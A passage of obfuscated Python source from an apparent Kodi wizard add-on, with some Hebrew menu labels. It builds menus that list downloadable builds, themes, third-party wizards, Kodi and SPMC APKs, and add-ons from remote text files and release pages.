	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOO0OOOO00O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	setView ('files','viewType')#line:2198
def buildMenu ():#line:2200
	if USERNAME =='':#line:2201
		ADDON .openSettings ()#line:2202
		sys .exit ()#line:2203
	if PASSWORD =='':#line:2204
		ADDON .openSettings ()#line:2205
	O0OOOOOO0O0OO0O0O =(SPEEDFILE )#line:2206
	(O0OOOOOO0O0OO0O0O )#line:2207
	OOOO0OO0000O0OOO0 =(wiz .workingURL (O0OOOOOO0O0OO0O0O ))#line:2208
	(OOOO0OO0000O0OOO0 )#line:2209
	OOOO0OO0000O0OOO0 =wiz .workingURL (SPEEDFILE )#line:2210
	if not OOOO0OO0000O0OOO0 ==True :#line:2211
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2213
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2214
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2215
		addFile ('%s'%OOOO0OO0000O0OOO0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2216
	else :#line:2217
		O00OOOO00OO000OOO ,OOOO00O00O000000O ,OO0000000OOOOO0OO ,O0000O000OO0O0OO0 ,O0O0OOO00OO00O00O ,OOO0000O00OOOOOOO ,O0000000O00O0OOOO =wiz .buildCount ()#line:2218
		OO00000O0OOO0O000 =False ;OO0O0OO0000OO0O00 =[]#line:2219
		if THIRDPARTY =='true':#line:2220
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00000O0OOO0O000 =True ;OO0O0OO0000OO0O00 .append ('1')#line:2221
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00000O0OOO0O000 =True ;OO0O0OO0000OO0O00 .append ('2')#line:2222
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00000O0OOO0O000 =True ;OO0O0OO0000OO0O00 .append ('3')#line:2223
		O000OO0OOOO0OO000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2224
		OOOOOO0OO0OOO0OOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OO0OOOO0OO000 )#line:2225
		if O00OOOO00OO000OOO ==1 and OO00000O0OOO0O000 ==False :#line:2226
			for OO0O0OO00O0OO000O ,O00O0O00O000000OO ,OO00O00O0OOO0O0O0 ,OOO000O00O0O00O00 ,O0O0OO0000OOOOOO0 ,OOO000OO00O0OOO00 ,OOO00O000O00O0000 ,O0O00OOOO0OO00OO0 ,O0000O0OOO0O0000O ,OO0O0OOOO0OOO00O0 in OOOOOO0OO0OOO0OOO :#line:2227
				if not SHOWADULT =='true'and O0000O0OOO0O0000O .lower ()=='yes':continue #line:2228
				if not DEVELOPER =='true'and wiz .strTest (OO0O0OO00O0OO000O ):continue #line:2229
				viewBuild (OOOOOO0OO0OOO0OOO [0 ][0 ])#line:2230
				return #line:2231
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2234
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2235
		if OO00000O0OOO0O000 ==True :#line:2236
			for O0OOO00O000000O0O in OO0O0OO0000OO0O00 :#line:2237
				OO0O0OO00O0OO000O =eval ('THIRD%sNAME'%O0OOO00O000000O0O )#line:2238
		if len (OOOOOO0OO0OOO0OOO )>=1 :#line:2240
			if SEPERATE =='true':#line:2241
				for OO0O0OO00O0OO000O ,O00O0O00O000000OO ,OO00O00O0OOO0O0O0 ,OOO000O00O0O00O00 ,O0O0OO0000OOOOOO0 ,OOO000OO00O0OOO00 ,OOO00O000O00O0000 ,O0O00OOOO0OO00OO0 ,O0000O0OOO0O0000O ,OO0O0OOOO0OOO00O0 in OOOOOO0OO0OOO0OOO :#line:2242
					if not SHOWADULT =='true'and O0000O0OOO0O0000O .lower ()=='yes':continue #line:2243
					if not DEVELOPER =='true'and wiz .strTest (OO0O0OO00O0OO000O ):continue #line:2244
					O0OOO00O0OOOO00OO =createMenu ('install','',OO0O0OO00O0OO000O )#line:2245
					addDir ('[%s] %s (v%s)'%(float (O0O0OO0000OOOOOO0 ),OO0O0OO00O0OO000O ,O00O0O00O000000OO ),'viewbuild',OO0O0OO00O0OO000O ,description =OO0O0OOOO0OOO00O0 ,fanart =O0O00OOOO0OO00OO0 ,icon =OOO00O000O00O0000 ,menu =O0OOO00O0OOOO00OO ,themeit =THEME2 )#line:2246
			else :#line:2247
				if O0000O000OO0O0OO0 >0 :#line:2248
					OOO00O0O0O0000O0O ='+'if SHOW17 =='false'else '-'#line:2249
					if SHOW17 =='true':#line:2251
						for OO0O0OO00O0OO000O ,O00O0O00O000000OO ,OO00O00O0OOO0O0O0 ,OOO000O00O0O00O00 ,O0O0OO0000OOOOOO0 ,OOO000OO00O0OOO00 ,OOO00O000O00O0000 ,O0O00OOOO0OO00OO0 ,O0000O0OOO0O0000O ,OO0O0OOOO0OOO00O0 in OOOOOO0OO0OOO0OOO :#line:2253
							if not SHOWADULT =='true'and O0000O0OOO0O0000O .lower ()=='yes':continue #line:2254
							if not DEVELOPER =='true'and wiz .strTest (OO0O0OO00O0OO000O ):continue #line:2255
							O0O0O00O00OOOOOO0 =int (float (O0O0OO0000OOOOOO0 ))#line:2256
							if O0O0O00O00OOOOOO0 ==17 :#line:2257
								O0OOO00O0OOOO00OO =createMenu ('install','',OO0O0OO00O0OO000O )#line:2258
								addDir ('[%s] %s (v%s)'%(float (O0O0OO0000OOOOOO0 ),OO0O0OO00O0OO000O ,O00O0O00O000000OO ),'viewbuild',OO0O0OO00O0OO000O ,description =OO0O0OOOO0OOO00O0 ,fanart =O0O00OOOO0OO00OO0 ,icon =OOO00O000O00O0000 ,menu =O0OOO00O0OOOO00OO ,themeit =THEME2 )#line:2259
				if O0O0OOO00OO00O00O >0 :#line:2260
					OOO00O0O0O0000O0O ='+'if SHOW18 =='false'else '-'#line:2261
					if SHOW18 =='true':#line:2263
						for OO0O0OO00O0OO000O ,O00O0O00O000000OO ,OO00O00O0OOO0O0O0 ,OOO000O00O0O00O00 ,O0O0OO0000OOOOOO0 ,OOO000OO00O0OOO00 ,OOO00O000O00O0000 ,O0O00OOOO0OO00OO0 ,O0000O0OOO0O0000O ,OO0O0OOOO0OOO00O0 in OOOOOO0OO0OOO0OOO :#line:2265
							if not SHOWADULT =='true'and O0000O0OOO0O0000O .lower ()=='yes':continue #line:2266
							if not DEVELOPER =='true'and wiz .strTest (OO0O0OO00O0OO000O ):continue #line:2267
							O0O0O00O00OOOOOO0 =int (float (O0O0OO0000OOOOOO0 ))#line:2268
							if O0O0O00O00OOOOOO0 ==18 :#line:2269
								O0OOO00O0OOOO00OO =createMenu ('install','',OO0O0OO00O0OO000O )#line:2270
								addDir ('[%s] %s (v%s)'%(float (O0O0OO0000OOOOOO0 ),OO0O0OO00O0OO000O ,O00O0O00O000000OO ),'viewbuild',OO0O0OO00O0OO000O ,description =OO0O0OOOO0OOO00O0 ,fanart =O0O00OOOO0OO00OO0 ,icon =OOO00O000O00O0000 ,menu =O0OOO00O0OOOO00OO ,themeit =THEME2 )#line:2271
				if OO0000000OOOOO0OO >0 :#line:2272
					OOO00O0O0O0000O0O ='+'if SHOW16 =='false'else '-'#line:2273
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOO00O0O0O0000O0O ,OO0000000OOOOO0OO ),'togglesetting','show16',themeit =THEME3 )#line:2274
					if SHOW16 =='true':#line:2275
						for OO0O0OO00O0OO000O ,O00O0O00O000000OO ,OO00O00O0OOO0O0O0 ,OOO000O00O0O00O00 ,O0O0OO0000OOOOOO0 ,OOO000OO00O0OOO00 ,OOO00O000O00O0000 ,O0O00OOOO0OO00OO0 ,O0000O0OOO0O0000O ,OO0O0OOOO0OOO00O0 in OOOOOO0OO0OOO0OOO :#line:2276
							if not SHOWADULT =='true'and O0000O0OOO0O0000O .lower ()=='yes':continue #line:2277
							if not DEVELOPER =='true'and wiz .strTest (OO0O0OO00O0OO000O ):continue #line:2278
							O0O0O00O00OOOOOO0 =int (float (O0O0OO0000OOOOOO0 ))#line:2279
							if O0O0O00O00OOOOOO0 ==16 :#line:2280
								O0OOO00O0OOOO00OO =createMenu ('install','',OO0O0OO00O0OO000O )#line:2281
								addDir ('[%s] %s (v%s)'%(float (O0O0OO0000OOOOOO0 ),OO0O0OO00O0OO000O ,O00O0O00O000000OO ),'viewbuild',OO0O0OO00O0OO000O ,description =OO0O0OOOO0OOO00O0 ,fanart =O0O00OOOO0OO00OO0 ,icon =OOO00O000O00O0000 ,menu =O0OOO00O0OOOO00OO ,themeit =THEME2 )#line:2282
				if OOOO00O00O000000O >0 :#line:2283
					OOO00O0O0O0000O0O ='+'if SHOW15 =='false'else '-'#line:2284
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOO00O0O0O0000O0O ,OOOO00O00O000000O ),'togglesetting','show15',themeit =THEME3 )#line:2285
					if SHOW15 =='true':#line:2286
						for OO0O0OO00O0OO000O ,O00O0O00O000000OO ,OO00O00O0OOO0O0O0 ,OOO000O00O0O00O00 ,O0O0OO0000OOOOOO0 ,OOO000OO00O0OOO00 ,OOO00O000O00O0000 ,O0O00OOOO0OO00OO0 ,O0000O0OOO0O0000O ,OO0O0OOOO0OOO00O0 in OOOOOO0OO0OOO0OOO :#line:2287
							if not SHOWADULT =='true'and O0000O0OOO0O0000O .lower ()=='yes':continue #line:2288
							if not DEVELOPER =='true'and wiz .strTest (OO0O0OO00O0OO000O ):continue #line:2289
							O0O0O00O00OOOOOO0 =int (float (O0O0OO0000OOOOOO0 ))#line:2290
							if O0O0O00O00OOOOOO0 <=15 :#line:2291
								O0OOO00O0OOOO00OO =createMenu ('install','',OO0O0OO00O0OO000O )#line:2292
								addDir ('[%s] %s (v%s)'%(float (O0O0OO0000OOOOOO0 ),OO0O0OO00O0OO000O ,O00O0O00O000000OO ),'viewbuild',OO0O0OO00O0OO000O ,description =OO0O0OOOO0OOO00O0 ,fanart =O0O00OOOO0OO00OO0 ,icon =OOO00O000O00O0000 ,menu =O0OOO00O0OOOO00OO ,themeit =THEME2 )#line:2293
		elif O0000000O00O0OOOO >0 :#line:2294
			if OOO0000O00OOOOOOO >0 :#line:2295
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
			else :#line:2298
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2300
	setView ('files','viewType')#line:2301
def viewBuild (O000OOOO000OO000O ):#line:2303
	OOOO00O0OOOO0O0O0 =wiz .workingURL (SPEEDFILE )#line:2304
	if not OOOO00O0OOOO0O0O0 ==True :#line:2305
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2306
		addFile ('%s'%OOOO00O0OOOO0O0O0 ,'',themeit =THEME3 )#line:2307
		return #line:2308
	if wiz .checkBuild (O000OOOO000OO000O ,'version')==False :#line:2309
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2310
		addFile ('%s was not found in the builds list.'%O000OOOO000OO000O ,'',themeit =THEME3 )#line:2311
		return #line:2312
	O000O0OO00O0O00OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2313
	O00OOO0OO0O0OO0OO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000OOOO000OO000O ).findall (O000O0OO00O0O00OO )#line:2314
	for O0OOOOO0O00O0O00O ,OO00O00OOOOOOOO00 ,OO00O0O0OOOOOOOO0 ,OOOOO0OOOO0O00O00 ,O0O0OO0OO0O00OOOO ,OO000O00OOO0O000O ,O0OOOOO0O000O0OOO ,O00O000O00O0OO00O ,O00O0OOO0OO00OO0O ,OO0OOO0OOO00O0OOO in O00OOO0OO0O0OO0OO :#line:2315
		OO000O00OOO0O000O =OO000O00OOO0O000O if wiz .workingURL (OO000O00OOO0O000O )else ICON #line:2316
		O0OOOOO0O000O0OOO =O0OOOOO0O000O0OOO if wiz .workingURL (O0OOOOO0O000O0OOO )else FANART #line:2317
		OOOOO0OOO0O0OOO00 ='%s (v%s)'%(O000OOOO000OO000O ,O0OOOOO0O00O0O00O )#line:2318
		if BUILDNAME ==O000OOOO000OO000O and O0OOOOO0O00O0O00O >BUILDVERSION :#line:2319
			OOOOO0OOO0O0OOO00 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOOOO0OOO0O0OOO00 ,BUILDVERSION )#line:2320
		O00O0OO0O000O0OOO =int (float (KODIV ));O000O0000OOOO0O00 =int (float (OOOOO0OOOO0O00O00 ))#line:2329
		if not O00O0OO0O000O0OOO ==O000O0000OOOO0O00 :#line:2330
			if O00O0OO0O000O0OOO ==16 and O000O0000OOOO0O00 <=15 :O0O0O0O0OO0OO0OOO =False #line:2331
			else :O0O0O0O0OO0OO0OOO =True #line:2332
		else :O0O0O0O0OO0OO0OOO =False #line:2333
		addFile ('התקנה','install',O000OOOO000OO000O ,'fresh',description =OO0OOO0OOO00O0OOO ,fanart =O0OOOOO0O000O0OOO ,icon =OO000O00OOO0O000O ,themeit =THEME1 )#line:2337
		if not O0O0OO0OO0O00OOOO =='http://':#line:2340
			if wiz .workingURL (O0O0OO0OO0O00OOOO )==True :#line:2341
				addFile (wiz .sep ('THEMES'),'',fanart =O0OOOOO0O000O0OOO ,icon =OO000O00OOO0O000O ,themeit =THEME3 )#line:2342
				O000O0OO00O0O00OO =wiz .openURL (O0O0OO0OO0O00OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2343
				O00OOO0OO0O0OO0OO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000O0OO00O0O00OO )#line:2344
				for O00OOOOO0O000O0O0 ,O00OOOO00OO0OOO0O ,O00O0O00OOO00000O ,OO00OOO00OOO000O0 ,O00O0OO0OOO00OO00 ,OO0OOO0OOO00O0OOO in O00OOO0OO0O0OO0OO :#line:2345
					if not SHOWADULT =='true'and O00O0OO0OOO00OO00 .lower ()=='yes':continue #line:2346
					O00O0O00OOO00000O =O00O0O00OOO00000O if O00O0O00OOO00000O =='http://'else OO000O00OOO0O000O #line:2347
					OO00OOO00OOO000O0 =OO00OOO00OOO000O0 if OO00OOO00OOO000O0 =='http://'else O0OOOOO0O000O0OOO #line:2348
					addFile (O00OOOOO0O000O0O0 if not O00OOOOO0O000O0O0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00OOOOO0O000O0O0 ,'theme',O000OOOO000OO000O ,O00OOOOO0O000O0O0 ,description =OO0OOO0OOO00O0OOO ,fanart =OO00OOO00OOO000O0 ,icon =O00O0O00OOO00000O ,themeit =THEME3 )#line:2349
	setView ('files','viewType')#line:2350
def viewThirdList (O000OOOO00OO00O0O ):#line:2352
	O0OO0O00O0000O00O =eval ('THIRD%sNAME'%O000OOOO00OO00O0O )#line:2353
	OO0OO00O0000O0OOO =eval ('THIRD%sURL'%O000OOOO00OO00O0O )#line:2354
	O0O00O00OO0OO000O =wiz .workingURL (OO0OO00O0000O0OOO )#line:2355
	if not O0O00O00OO0OO000O ==True :#line:2356
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2357
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2358
	else :#line:2359
		OO0O0O000O0000O0O ,OOO00O000OOOO0OO0 =wiz .thirdParty (OO0OO00O0000O0OOO )#line:2360
		addFile ("[B]%s[/B]"%O0OO0O00O0000O00O ,'',themeit =THEME3 )#line:2361
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2362
		if OO0O0O000O0000O0O :#line:2363
			for O0OO0O00O0000O00O ,O000OOOOOO0O0OOO0 ,OO0OO00O0000O0OOO ,O0O0O00OO0O00O0OO ,O00OO0O0OOOO00000 ,O0OO0OOO00OOO0OO0 ,O000OO0OOOOO0O000 ,O0O000000O0OOOO0O in OOO00O000OOOO0OO0 :#line:2364
				if not SHOWADULT =='true'and O000OO0OOOOO0O000 .lower ()=='yes':continue #line:2365
				addFile ("[%s] %s v%s"%(O0O0O00OO0O00O0OO ,O0OO0O00O0000O00O ,O000OOOOOO0O0OOO0 ),'installthird',O0OO0O00O0000O00O ,OO0OO00O0000O0OOO ,icon =O00OO0O0OOOO00000 ,fanart =O0OO0OOO00OOO0OO0 ,description =O0O000000O0OOOO0O ,themeit =THEME2 )#line:2366
		else :#line:2367
			for O0OO0O00O0000O00O ,OO0OO00O0000O0OOO ,O00OO0O0OOOO00000 ,O0OO0OOO00OOO0OO0 ,O0O000000O0OOOO0O in OOO00O000OOOO0OO0 :#line:2368
				addFile (O0OO0O00O0000O00O ,'installthird',O0OO0O00O0000O00O ,OO0OO00O0000O0OOO ,icon =O00OO0O0OOOO00000 ,fanart =O0OO0OOO00OOO0OO0 ,description =O0O000000O0OOOO0O ,themeit =THEME2 )#line:2369
def editThirdParty (OO00OO00OOO000000 ):#line:2371
	OOOOO000O0OO00O00 =eval ('THIRD%sNAME'%OO00OO00OOO000000 )#line:2372
	OOOO0OOO0OO000OOO =eval ('THIRD%sURL'%OO00OO00OOO000000 )#line:2373
	OO00OO0OOO00O0000 =wiz .getKeyboard (OOOOO000O0OO00O00 ,'Enter the Name of the Wizard')#line:2374
	O00OOO000OOO00OOO =wiz .getKeyboard (OOOO0OOO0OO000OOO ,'Enter the URL of the Wizard Text')#line:2375
	wiz .setS ('wizard%sname'%OO00OO00OOO000000 ,OO00OO0OOO00O0000 )#line:2377
	wiz .setS ('wizard%surl'%OO00OO00OOO000000 ,O00OOO000OOO00OOO )#line:2378
def apkScraper (name =""):#line:2380
	if name =='kodi':#line:2381
		OO000OOO00O0O0O00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2382
		O0OO00O00OO00000O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2383
		O00O0O0OO0OO000OO =wiz .openURL (OO000OOO00O0O0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2384
		O000O000OOOO0000O =wiz .openURL (O0OO00O00OO00000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2385
		O0OOO0O000000000O =0 #line:2386
		OO00O0O0OOO00O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00O0O0OO0OO000OO )#line:2387
		OO0O0OO0OO00OO00O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000O000OOOO0000O )#line:2388
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2390
		OO00OOO0OOO00OOO0 =False #line:2391
		for O00OOOOOO000O0O0O ,name ,O0OOO0O0O0OOOOO00 ,OO0OO0O0OOOO00O0O in OO00O0O0OOO00O0O0 :#line:2392
			if O00OOOOOO000O0O0O in ['../','old/']:continue #line:2393
			if not O00OOOOOO000O0O0O .endswith ('.apk'):continue #line:2394
			if not O00OOOOOO000O0O0O .find ('_')==-1 and OO00OOO0OOO00OOO0 ==True :continue #line:2395
			try :#line:2396
				O0OOOO0O0O0OO00O0 =name .split ('-')#line:2397
				if not O00OOOOOO000O0O0O .find ('_')==-1 :#line:2398
					OO00OOO0OOO00OOO0 =True #line:2399
					OOOOOO0000000OO00 ,O000O00OO0O0O0OO0 =O0OOOO0O0O0OO00O0 [2 ].split ('_')#line:2400
				else :#line:2401
					OOOOOO0000000OO00 =O0OOOO0O0O0OO00O0 [2 ]#line:2402
					O000O00OO0O0O0OO0 =''#line:2403
				O00O0O0OOOOO000O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO0O0O0OO00O0 [0 ].title (),O0OOOO0O0O0OO00O0 [1 ],O000O00OO0O0O0OO0 .upper (),OOOOOO0000000OO00 ,COLOR2 ,O0OOO0O0O0OOOOO00 .replace (' ',''),COLOR1 ,OO0OO0O0OOOO00O0O )#line:2404
				O0O0000OO00O00OOO =urljoin (OO000OOO00O0O0O00 ,O00OOOOOO000O0O0O )#line:2405
				addFile (O00O0O0OOOOO000O0 ,'apkinstall',"%s v%s%s %s"%(O0OOOO0O0O0OO00O0 [0 ].title (),O0OOOO0O0O0OO00O0 [1 ],O000O00OO0O0O0OO0 .upper (),OOOOOO0000000OO00 ),O0O0000OO00O00OOO )#line:2406
				O0OOO0O000000000O +=1 #line:2407
			except :#line:2408
				wiz .log ("Error on: %s"%name )#line:2409
		for O00OOOOOO000O0O0O ,name ,O0OOO0O0O0OOOOO00 ,OO0OO0O0OOOO00O0O in OO0O0OO0OO00OO00O :#line:2411
			if O00OOOOOO000O0O0O in ['../','old/']:continue #line:2412
			if not O00OOOOOO000O0O0O .endswith ('.apk'):continue #line:2413
			if not O00OOOOOO000O0O0O .find ('_')==-1 :continue #line:2414
			try :#line:2415
				O0OOOO0O0O0OO00O0 =name .split ('-')#line:2416
				O00O0O0OOOOO000O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO0O0O0OO00O0 [0 ].title (),O0OOOO0O0O0OO00O0 [1 ],O0OOOO0O0O0OO00O0 [2 ],COLOR2 ,O0OOO0O0O0OOOOO00 .replace (' ',''),COLOR1 ,OO0OO0O0OOOO00O0O )#line:2417
				O0O0000OO00O00OOO =urljoin (O0OO00O00OO00000O ,O00OOOOOO000O0O0O )#line:2418
				addFile (O00O0O0OOOOO000O0 ,'apkinstall',"%s v%s %s"%(O0OOOO0O0O0OO00O0 [0 ].title (),O0OOOO0O0O0OO00O0 [1 ],O0OOOO0O0O0OO00O0 [2 ]),O0O0000OO00O00OOO )#line:2419
				O0OOO0O000000000O +=1 #line:2420
			except :#line:2421
				wiz .log ("Error on: %s"%name )#line:2422
		if O0OOO0O000000000O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2423
	elif name =='spmc':#line:2424
		OOOO00OO00O00OOOO ='https://github.com/koying/SPMC/releases'#line:2425
		O00O0O0OO0OO000OO =wiz .openURL (OOOO00OO00O00OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2426
		O0OOO0O000000000O =0 #line:2427
		OO00O0O0OOO00O0O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O00O0O0OO0OO000OO )#line:2428
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2430
		for name ,OOO0O0O00O0OOOOOO in OO00O0O0OOO00O0O0 :#line:2432
			OOO0000O0000O00OO =''#line:2433
			OO0O0OO0OO00OO00O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOO0O0O00O0OOOOOO )#line:2434
			for O0OOO0OO0OOOO0OOO ,O0O0O000OOO0OOO0O ,O0O0OO00O0O00OO00 in OO0O0OO0OO00OO00O :#line:2435
				if O0O0OO00O0O00OO00 .find ('armeabi')==-1 :continue #line:2436
				if O0O0OO00O0O00OO00 .find ('launcher')>-1 :continue #line:2437
				OOO0000O0000O00OO =urljoin ('https://github.com',O0OOO0OO0OOOO0OOO )#line:2438
				break #line:2439
		if O0OOO0O000000000O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2441
def apkMenu (url =None ):#line:2443
	if url ==None :#line:2444
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2447
	if not APKFILE =='http://':#line:2448
		if url ==None :#line:2449
			O0OO0OO00OO00OO0O =wiz .workingURL (APKFILE )#line:2450
			OO0O00O0O000O0000 =uservar .APKFILE #line:2451
		else :#line:2452
			O0OO0OO00OO00OO0O =wiz .workingURL (url )#line:2453
			OO0O00O0O000O0000 =url #line:2454
		if O0OO0OO00OO00OO0O ==True :#line:2455
			OOO0OO00O00000O0O =wiz .openURL (OO0O00O0O000O0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2456
			O00OO0O0OO0O00OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0OO00O00000O0O )#line:2457
			if len (O00OO0O0OO0O00OO0 )>0 :#line:2458
				OO00OO0000000000O =0 #line:2459
				for OO00O0O0OOO00OO00 ,O00O000OO000OOOO0 ,url ,OOO0O0O00OOO0O00O ,OO00OOO0O0O00O0OO ,O0OOO00O0O000OO0O ,O000000000OOOO000 in O00OO0O0OO0O00OO0 :#line:2460
					if not SHOWADULT =='true'and O0OOO00O0O000OO0O .lower ()=='yes':continue #line:2461
					if O00O000OO000OOOO0 .lower ()=='yes':#line:2462
						OO00OO0000000000O +=1 #line:2463
						addDir ("[B]%s[/B]"%OO00O0O0OOO00OO00 ,'apk',url ,description =O000000000OOOO000 ,icon =OOO0O0O00OOO0O00O ,fanart =OO00OOO0O0O00O0OO ,themeit =THEME3 )#line:2464
					else :#line:2465
						OO00OO0000000000O +=1 #line:2466
						addFile (OO00O0O0OOO00OO00 ,'apkinstall',OO00O0O0OOO00OO00 ,url ,description =O000000000OOOO000 ,icon =OOO0O0O00OOO0O00O ,fanart =OO00OOO0O0O00O0OO ,themeit =THEME2 )#line:2467
					if OO00OO0000000000O <1 :#line:2468
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2469
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2470
		else :#line:2471
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2472
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2473
			addFile ('%s'%O0OO0OO00OO00OO0O ,'',themeit =THEME3 )#line:2474
		return #line:2475
	else :wiz .log ("[APK Menu] No APK list added.")#line:2476
	setView ('files','viewType')#line:2477
def addonMenu (url =None ):#line:2479
	if not ADDONFILE =='http://':#line:2480
		if url ==None :#line:2481
			OO0OO000O000O00O0 =wiz .workingURL (ADDONFILE )#line:2482
			O0O0OOO00OO0O0O00 =uservar .ADDONFILE #line:2483
		else :#line:2484
			OO0OO000O000O00O0 =wiz .workingURL (url )#line:2485
			O0O0OOO00OO0O0O00 =url #line:2486
		if OO0OO000O000O00O0 ==True :#line:2487
			OO0O0O0O0O0O000OO =wiz .openURL (O0O0OOO00OO0O0O00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2488
			O0O0OOO00OOOOOOO0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0O0O0O0O000OO )#line:2489
			if len (O0O0OOO00OOOOOOO0 )>0 :#line:2490
				O00O0O0OOO0OOOOO0 =0 #line:2491
				for O0000O00OOOO00O00 ,O0O0O0000OOO00O0O ,url ,OO0OOO00000OOO0OO ,OOO00000OOO00O0O0 ,OOOOOO000OO00O0O0 ,O0O0O0O0O00O000OO ,O00OOOOO000O0OO00 ,O0OOOOO000O0OO00O ,O00OOO000OOO0O0O0 in O0O0OOO00OOOOOOO0 :#line:2492
					if O0O0O0000OOO00O0O .lower ()=='section':#line:2493
						O00O0O0OOO0OOOOO0 +=1 #line:2494
						addDir ("[B]%s[/B]"%O0000O00OOOO00O00 ,'addons',url ,description =O00OOO000OOO0O0O0 ,icon =O0O0O0O0O00O000OO ,fanart =O00OOOOO000O0OO00 ,themeit =THEME3 )#line:2495
					else :#line:2496
						if not SHOWADULT =='true'and O0OOOOO000O0OO00O .lower ()=='yes':continue #line:2497
						try :#line:2498
							OOO0OOO0OOO0OOOOO =xbmcaddon .Addon (id =O0O0O0000OOO00O0O ).getAddonInfo ('path')#line:2499
							if os .path .exists (OOO0OOO0OOO0OOOOO ):#line:2500
								O0000O00OOOO00O00 ="[COLOR green][Installed][/COLOR] %s"%O0000O00OOOO00O00 #line:2501
						except :#line:2502
							pass #line:2503
						O00O0O0OOO0OOOOO0 +=1 #line:2504
